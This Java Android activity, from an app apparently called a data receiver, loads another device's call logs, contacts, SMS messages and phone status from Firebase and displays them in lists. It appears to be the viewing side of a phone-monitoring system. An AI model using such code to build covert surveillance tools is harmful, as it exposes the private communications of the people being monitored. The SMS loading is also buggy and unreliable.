package com.example.datareciever;

import androidx.annotation.NonNull;
import androidx.appcompat.app.AppCompatActivity;

import android.content.Intent;
import android.os.Bundle;
import android.widget.ListView;
import android.widget.Toast;

import com.google.firebase.database.DataSnapshot;
import com.google.firebase.database.DatabaseError;
import com.google.firebase.database.DatabaseReference;
import com.google.firebase.database.FirebaseDatabase;
import com.google.firebase.database.ValueEventListener;

import java.util.ArrayList;

import Classes.CallLogs;
import Classes.MobileStatus;
import Classes.PersonContact;
import Classes.smsData;

public class Display_Data extends AppCompatActivity {

    ArrayList<MobileStatus> mobileStatusArrayList2 = new ArrayList<>();
    ArrayList<PersonContact> personContactArrayList2= new ArrayList<>();
    ArrayList<CallLogs> callLogsArrayList= new ArrayList<>();
    ArrayList<smsData> smsDataArrayList= new ArrayList<>();
    ArrayList<String> smsIdList = new ArrayList<>();

    ListView listView;

    int REQEST_CODE;

    String UserName_From_Previous;


    //Contacts
    ContactsAdapter_litsview contactsAdapter_litsview;
    ListView contactslistView;

    Array_Adapter_Last array_adapter_last;
    sms_Listview_Adapter smsAdapter;

    //Call  Logs
    ListView Logs_list;
    Call_Logs_Adapter call_logs_adapter;

    //DatraBase Initialization
    FirebaseDatabase firebaseDatabase = FirebaseDatabase.getInstance();
    DatabaseReference CallRef,contactRef,smsREf;
    DatabaseReference statusRef;


    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_display__data);


        REQEST_CODE= getIntent().getExtras().getInt("Key");
        UserName_From_Previous= getIntent().getStringExtra("User_NAME");



        //Database Initialization

        CallRef = firebaseDatabase.getReference().child("CallLogs").child(UserName_From_Previous);
        contactRef= firebaseDatabase.getReference().child("Contacts").child(UserName_From_Previous);
        statusRef = firebaseDatabase.getReference().child("MobileStatus").child(UserName_From_Previous);




        if(REQEST_CODE == 1)
        {
           getStatus();
           StatusListview();

        }
         else if(REQEST_CODE==2)
        {
            ContactsListview();
            getcontacts();
        }
        else if(REQEST_CODE==3)
        {
            CalllogsListview();
            getCallLogs();
        }
        else if(REQEST_CODE==4)
        {
        getsmsId();
        getSMsFinal();
        smsListView();
        }



















    }





        private void StatusListview(){


            listView= findViewById(R.id.displayList);
            array_adapter_last = new Array_Adapter_Last(this,mobileStatusArrayList2);
            listView.setAdapter(array_adapter_last);



        }


        private  void ContactsListview(){

           contactslistView=  findViewById(R.id.displayList);
           contactsAdapter_litsview =  new ContactsAdapter_litsview(this,personContactArrayList2);
            contactslistView.setAdapter(contactsAdapter_litsview);

        }

        private void CalllogsListview(){

        Logs_list = findViewById(R.id.displayList);
        call_logs_adapter  = new Call_Logs_Adapter(this,callLogsArrayList);
        Logs_list.setAdapter(call_logs_adapter);


        }

        private void getsmsId(){
                Bundle bundle = getIntent().getExtras();
            smsIdList= (ArrayList<String>) bundle.getSerializable("SmsID");

        }

        private void smsListView(){
            ListView smsList = findViewById(R.id.displayList);
            smsAdapter = new sms_Listview_Adapter(this,smsDataArrayList);
            smsList.setAdapter(smsAdapter);

        }









        //Getting data from database
        private void getcontacts(){

            contactRef.addListenerForSingleValueEvent(new ValueEventListener() {
                @Override
                public void onDataChange(@NonNull DataSnapshot dataSnapshot) {

                    for(DataSnapshot dataSnapshot2 : dataSnapshot.getChildren())
                    {
                        PersonContact personContact = dataSnapshot2.getValue(PersonContact.class);
                        personContactArrayList2.add(personContact);

                    }
                    contactsAdapter_litsview.notifyDataSetChanged();
                    Toast.makeText(Display_Data.this, "Got Contacts", Toast.LENGTH_SHORT).show();



                }

                @Override
                public void onCancelled(@NonNull DatabaseError databaseError) {

                }
            });

        }

    private void getCallLogs(){

        CallRef.addListenerForSingleValueEvent(new ValueEventListener() {
            @Override
            public void onDataChange(@NonNull DataSnapshot dataSnapshot) {
                for(DataSnapshot dataSnapshot3 : dataSnapshot.getChildren())
                {
                    CallLogs callLogs = dataSnapshot3.getValue(CallLogs.class);
                    callLogsArrayList.add(callLogs);
                }

                call_logs_adapter.notifyDataSetChanged();

                Toast.makeText(Display_Data.this, "Got all call logs", Toast.LENGTH_SHORT).show();
            }

            @Override
            public void onCancelled(@NonNull DatabaseError databaseError) {

            }
        });
    }

    private void getStatus(){


        statusRef.addListenerForSingleValueEvent(new ValueEventListener() {
            @Override
            public void onDataChange(@NonNull DataSnapshot dataSnapshot) {

                MobileStatus mobileStatus = dataSnapshot.getValue(MobileStatus.class);
                mobileStatusArrayList2.add(mobileStatus);
                array_adapter_last.notifyDataSetChanged();

                Toast.makeText(Display_Data.this, "Got Status", Toast.LENGTH_SHORT).show();
            }

            @Override
            public void onCancelled(@NonNull DatabaseError databaseError) {

            }
        });



    }

    private void getSMsFinal(){

        for(int i=0; i<smsIdList.size() ;i++)
        {
            String id = smsIdList.get(i);
            DatabaseReference smsFinalREf = FirebaseDatabase.getInstance().getReference().child("SmsData").child("Boss").child(id);
            Toast.makeText(this, "ref creasted", Toast.LENGTH_SHORT).show();
            smsFinalREf.addListenerForSingleValueEvent(new ValueEventListener() {
                @Override
                public void onDataChange(@NonNull DataSnapshot dataSnapshot) {

                    for(DataSnapshot dataSnapshot5 : dataSnapshot.getChildren())
                    {
                        smsData smsdata = dataSnapshot5.getValue(smsData.class);
                        smsDataArrayList.add(smsdata);

                    }

                }

                @Override
                public void onCancelled(@NonNull DatabaseError databaseError) {

                }
            });

        }



        Toast.makeText(this, "Got all Sms", Toast.LENGTH_SHORT).show();

    }









}
